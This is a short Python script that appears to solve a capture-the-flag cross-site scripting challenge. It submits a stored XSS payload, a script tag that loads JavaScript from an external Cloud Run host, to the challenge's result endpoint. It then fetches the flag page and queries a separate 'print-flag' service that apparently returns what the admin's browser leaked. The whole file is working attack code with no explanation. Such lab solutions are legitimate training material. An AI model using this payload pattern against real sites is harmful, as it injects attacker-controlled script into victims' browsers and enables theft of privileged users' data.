import sys
import requests 

payload = "<script src='https://javascript-server-808630243113.us-central1.run.app'> </script>"
print_url = "https://print-flag-808630243113.us-central1.run.app"

if len(sys.argv) != 2:
    print("Please specify challenge URL")
    print("python solution.py <challenge-url>")
else:  
	param = {'payload':payload}
	response = requests.post(sys.argv[1] + '/xss-two-result', data=param)
	response = requests.get(sys.argv[1] + '/xss-two-flag')
	print("Response as non-Admin")
	print(response.text)
	print("Response as Admin")
	response = requests.get(print_url)
	print(response.text)








